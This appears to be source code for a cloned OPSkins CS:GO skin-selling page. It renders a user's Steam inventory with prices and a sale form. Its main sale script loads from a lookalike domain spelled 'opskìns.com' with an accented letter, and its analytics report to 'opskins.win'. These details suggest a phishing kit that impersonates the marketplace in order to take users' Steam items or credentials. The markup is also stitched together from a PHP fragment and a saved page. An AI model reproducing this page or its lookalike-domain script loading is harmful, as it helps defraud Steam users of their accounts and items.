              echo "<div href='javascript:tooffer($i);'  id='$i' class='sell-item sell-form-commodity'>
              <div class='sell-commodity-quantity'>×1</div> <img  src='https://steamcommunity-a.akamaihd.net/economy/image/".$data_content['rgDescriptions'][$name_item]['icon_url']."/62fx62f";
              //print_r($data_content['rgDescriptions'][$name_item]['icon_url']);
              print"'\">";

              echo"<div class='sell-item-name'>".$market_hash_name. $contextid."</div>";
                 echo'<div id="smma" style="display:none">';
              $j = file_get_contents( 'prices.json');
         $data = json_decode($j,TRUE );



  print  $data[$market_hash_name];

echo"</div>";

 echo"</div> ";
 

//echo "$element_name[id]";







            }

        }

      }
      ?>
</div></div>
 <script>
 $(".sell-item").click(function(){
     $("#sell-selected-name").hide();
     $("#sell-selected-suggestedprice").css('display','block');

     if($(".sell-item").hasClass("selected") ) {

      $('.sell-item').removeClass("selected");
      $(this).toggleClass("selected");
     }else{
         $(this).toggleClass("selected");
     }
     var targ = $(this).find('img').attr("src");

     var targprice = $(this).find('#smma').text();
     $("#pricelow").text(targprice);
     if(targprice>'1.03'&&targprice<'50'){
         var newprice = +targprice+1.2;
     $("#pricesewen").text(newprice.toFixed(2));
     }else{
          var newprice = +targprice+0.02;
         $("#pricesewen").text(newprice.toFixed(2));
     }
     if(targprice>'50'&&targprice<'100'){
         var newprice = +targprice+10;
     $("#pricesewen").text(newprice.toFixed(2));
     }
       if(targprice>'100'&&targprice<'400'){
         var newprice = +targprice+50;
     $("#pricesewen").text(newprice.toFixed(2));
     }
     if(targprice>'400'&&targprice<'2000'){
         var newprice = +targprice+60;
     $("#pricesewen").text(newprice.toFixed(2));
     }
     $("#pricesteam").text(targprice);

     var newlink = targ.split('/');

     $("#sell-selected-search-btn").show();
     $("#sell-selected-inspect-btn").show();

     console.log('targ - ' + newlink[6]);
     newlink[6]="308fx308f";
     var looklike = newlink.join("/");
     $("#sell-selected-img").attr("src", looklike);
 });
 </script>
<div class="col-md-4 col-lg-2">
<h3 class="nopad">Price Your Item</h3>
<div id="sell-selected-box">
<div id="sell-selected-name" style="">Click on an item to sell</div>
<div id="sell-selected-type"></div>
<div id="sell-selected-extrainfo"></div>
<div id="sell-selected-stickers"></div>
<img src="/images/graphic-only-logo.png" id="sell-selected-img" style="visibility: visible;">
<a  id="sell-selected-search-btn" class="btn btn-primary btn-sm sell-selected-btn" target="_blank" style="display: none;">Search</a>
<a  id="sell-selected-inspect-btn" class="btn btn-primary btn-sm sell-selected-btn" style="display: none;">Inspect</a>
<div id="sell-selected-suggestedprice" style="display: none;">
<strong>Suggested Prices</strong><br>
<img src="/images/opskins-logo-avatar.png">Lowest Price: <span id="suggested-op-lowest"><em id="pricelow"></em><em>$</em></span><br>
<img src="/images/opskins-logo-avatar.png">7-Day Average: <span id="suggested-op-average"><em id="pricesewen"></em><em>$</em></span><br>
<span id="steam-market-price"><i class="stm stm-steam"></i> Steam Market: <span id="suggested-steam-market"><em id="pricesteam"></em><em>$</em></span></span>
<span id="steam-analyst-price" style="display:none;"><i class="stm stm-steam"></i> Steam Analyst: <span id="suggested-steam-analyst"><em>none</em></span></span>
</div>
</div>
<form id="set-item-price" class="form-horizontal">
<div class="form-group">
<div class="text-center">
<label for="sell-auto-discount" class="control-label">
Auto-Price (%) </label>
</div>
<div class="text-center" style="padding-bottom: 5px;">
<input type="number" class="form-control" id="sell-auto-discount" value="0" min="0" max="60" title="">
</div>
<div class="text-center">
<div class="btn-group block" data-toggle="buttons">
<label class="btn btn-primary btn-sm clearfix active">
<input type="radio" name="toggle-percentage" autocomplete="off" value="-1" checked=""> lower
</label>
<label class="btn btn-primary btn-sm clearfix">
<input type="radio" name="toggle-percentage" autocomplete="off" value="1"> higher
</label>
</div>
</div>
</div>
<hr>
<div class="form-group">
<label for="sell-list-price" class="col-sm-4 control-label">
List Price </label>
<div class="col-sm-8">
<input type="number" class="form-control" id="sell-list-price" min="0.02" max="99999.99" step="0.01">
</div>
</div>
<div class="form-group">
<label for="sell-our-cut" class="col-sm-4 control-label">
Our Cut </label>
<div class="col-sm-8">
<input type="text" class="form-control" id="sell-our-cut" readonly="">
</div>
</div>
<div class="form-group">
<label for="sell-your-cut" class="col-sm-4 control-label">
Your Cut </label>
<div class="col-sm-8">
<input type="number" class="form-control" id="sell-your-cut" min="0.01" max="89999.99" step="0.01">
</div>
</div>
<div class="form-group" id="addons-group">
<label for="sell-addons" class="col-sm-4 control-label">
Addons </label>
<div class="col-sm-8">
<select id="sell-addons" class="form-control">
<option value="">($0.00) None</option>
<option value="private">($2.95) Private Listing - Item can only be viewed and purchased with a direct link</option>
<option value="featured">($2.95) Featured Listing - Display item prominently on homepage and other areas of site</option>
<option value="screenshot">($0.49) Instant Field Inspection™ - Take and display in-game screenshots of item</option>
<option value="ss_sc_bundle">($4.45) Featured Listing + Instant Field Inspection™</option>
</select>
</div>
</div>
<div class="form-group" id="sell-form-quantity-group">
<label for="sell-quantity" class="col-sm-4 control-label">
Quantity </label>
<div class="col-sm-8">
<input type="number" class="form-control" id="sell-quantity" min="1" max="100" value="1">
</div>
</div>
<div class="checkbox" id="deposit-into-osi">
<label>
<input type="checkbox">
<span>Deposit into OPSkins inventory <i class="fa fa-question-circle hover-help" title="Deposit this item into my OPSkins inventory instead of listing it for sale once it's received by the bot"></i></span>
</label>
</div>
<div class="form-group">
<div class="col-sm-12">
<button type="submit" id="sell-form-submit" class="btn btn-primary btn-block" disabled="">Next →</button>
</div>
</div>
</form>
</div>
<div class="col-md-4 col-lg-5">
<h3 class="nopad">Your Sale Queue <small><span id="queue-count">0</span>/100, <span id="queue-total">$0.00</span></small></h3>
<div id="queue-spinner"><i class="fa fa-refresh fa-spin"></i></div>
<div class="alert alert-danger" id="notEnoughFunds" style="display:none;">
You don't have enough funds to cover these addon costs! Please remove some addons to continue. </div>
<div id="queue-container">
<div class="alert alert-info">
<p><i class="fa fa-info-circle"></i> You have no items in your sale queue yet. Please select an item to sell in the left pane.</p><p>Add items to your sale queue, then click the button below to list them for sale. <strong>You will not receive any trade offers from OPSkins until you click the deposit button.</strong></p><p>Looking for your active sale listings? You can find those on your <a href="/?loc=store_account#collapseIS" class="alert-link">account page</a>.</p> </div>
</div>
<div class="clearfix"></div>
<div>
<button type="button" class="btn btn-orange" id="depositBtn" disabled="">
<span id="deposit-btn-steam">Deposit Items</span>
<span id="deposit-btn-osi">List Items for Sale</span>
<span id="depositBtnDueAmt"></span>
</button>
</div>
</div>
</div>
<div id="cPrefs" class="">
<a href="javascript:openSellPrefs()">Selling Preferences</a>
</div>
<script src="https://opskìns.com/opskins.sell.js?v=3f950a66" type="text/javascript"></script> <div class="footer">
<p class="text-muted small"><a href="https://steampowered.com" target="_blank">Powered by Steam</a>,
a registered trademark of Valve Corporation.
OPSkins logo is a trademark of <a href="/">OPSkins.com</a> - CS:GO Marketplace |
<a href="/tos.html" target="_BLANK">Terms &amp; Conditions</a></p>
</div>
<script>
            $(document).ready(function () {
                $('#tModal').modal({backdrop: 'static',
                    show: true
                });
            });

$('#nav-cart-container').hide();                            </script>
<div id="modalContainer"></div>
<script src="/js/opskins.client.js?v=781c9b64" type="text/javascript"></script><div class="modal fade" id="searchEngineHelp" tabindex="-1" role="dialog" aria-labelledby="searchEngineHelpLabel">
<aside>
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
<h4 class="modal-title" id="searchEngineHelpLabel">Advanced Search Functionalities</h4>
</div>
<div class="modal-body">
<h2>+ signifies AND operation</h2>
<p>Put <code>+</code> between two terms and it’ll search listings that include both terms.</p>
<p><strong>Example:</strong> Searching CS:GO for <code>knife + doppler</code> or <code>knife+doppler</code> will bring up all listings including both terms such as <code>Gut Knife | Doppler</code>, <code>StatTrak Gut Knife | Doppler</code>, etc.</p>
<h2>| signifies OR operation</h2>
<p>Use <code>|</code> with NO spaces between two or more terms to search multiple terms</p>
<p><strong>Example:</strong> Searching <code>nova|antique</code> will find you all listings with the words nova OR antique. However searching <code>nova | antique</code> behaves as if the vertical line wasn’t there at all, and will instead treat the search as if it were <code>nova antique</code>.</p>
<h2>- excludes a term</h2>
<p>Using <code>-</code> before a term means that term will NOT appear in search results.</p>
<p><strong>Example:</strong> Searching <code>gut knife -doppler -slaughter</code> will show all gut knives except dopplers and slaughters.</p>
<h2>" searches the exact phrase</h2>
<p>Using quotation marks before and after a term will generate results that include only that exact term.</p>
<p><strong>Example 1:</strong> searching <code>nova "hyper beast"</code> will generate all <code>Nova | Hyper Beast</code> listings including StatTrak items. <br><strong>Example 2:</strong> searching <code>"hyper beast"</code> will include all hyper beast items, including the <code>M4A1-S | Hyper Beast</code>, the <code>AWP | Hyper Beast</code>, etc.</p>
<h2>* at the end of a term signifies a prefix query</h2>
<p>Using <code>*</code> at the end of a term will generate any results where characters appear after the term.</p>
<p><strong>Example:</strong> Searching in PUBG items for <code>pleated*</code> will generated all Pleated Mini Skirts, whereas searching <code>mini*</code> will show any Mini Skirt.</p>
<h2>~N after a word signifies fuzziness</h2>
<p>Put <code>~</code> and a number after a word to tell the Advanced Search engine how closely you want the results to match that term.</p>
<p><strong>Example 1:</strong> Searching CS:GO items for <code>hyper~2</code> would show not only results containing the word Hyper, but also results with words that are two characters off, such as in this case Viper, since you indicated a fuzziness of two with the <code>~2</code>.<br><strong>Example 2:</strong> Searching <code>M4A1~1</code> would show you all <code>M4A1</code> and <code>M4A4</code> skins because you’re allowing the term to be off by one character, whereas <code>M4A1~2</code> will also result in those skins plus the <code>AK-47 | Orbit Mk01</code> since that item name contains <code>M_ _ 1</code> and you indicated a fuzziness of two.
</p>
<p>For a more detailed summary of Advanced Search Features, visit our <a href="https://blog.opskins.com/new-advanced-search-features/">blog post</a>.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
</div>
</div>
</div>
</aside>
</div>


<div style="display: none; visibility: hidden;"><script type="text/javascript">(window.Image?new Image:document.createElement("img")).src=location.protocol+"//vk.com/rtrg?r\x3dEUS16P8geD7erUCLaOFM7zQH3pxfxFMnJRkrskal8ukeCj8Pd/La/9zFKOP3hgV9Rn66k1lmMgkHTglL8uCwAGdq91reZFf71pfnONYDyxoxor9cdyKL/JnfitMzEIhOlCrX24WOINGnP6hAZqJM/1eJWrKb1DbsxqpEQKR0DtM-\x26pixel_id\x3d1000095037";</script></div><script src="https://cdn.siftscience.com/s.js"></script>
<script type="text/javascript" id="">var _paq=_paq||[];_paq.push(["setDocumentTitle",document.domain+"/"+document.title]);_paq.push(["setCookieDomain","*.opskins.com"]);_paq.push(["setDomains",["*.opskins.com","checkout.pay.g2a.com","*.paypal.com","*.skrill.com"]]);_paq.push(["enableCrossDomainLinking"]);_paq.push(["setUserId","4182747"]);_paq.push(["setCustomDimension",2,"New Customer"]);_paq.push(["trackPageView"]);_paq.push(["enableLinkTracking"]);
(function(){var c="//piwik.opskins.win/";_paq.push(["setTrackerUrl",c+"piwik.php"]);_paq.push(["setSiteId","1"]);var a=document,b=a.createElement("script");a=a.getElementsByTagName("script")[0];b.type="text/javascript";b.async=!0;b.defer=!0;b.src=c+"piwik.js";a.parentNode.insertBefore(b,a)})();</script>
<noscript>&lt;p&gt;&lt;img src="//piwik.opskins.win/piwik.php?idsite=1&amp;amp;rec=1" style="border:0;" alt=""&gt;&lt;/p&gt;</noscript>
</body></html>
